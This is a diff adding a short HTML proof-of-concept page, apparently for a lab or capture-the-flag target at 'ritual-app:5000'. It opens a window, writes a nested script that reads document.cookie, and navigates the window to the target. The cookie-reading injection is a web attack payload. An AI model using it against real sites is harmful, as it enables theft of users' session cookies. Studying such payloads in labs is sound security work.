@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+let w = open();
+
+w.document.write(`
+<script>
+console.log(document.cookie)
+</script>
+`);
+
+w.location = "http://ritual-app:5000/";
+</script>
+</body>
+</html>
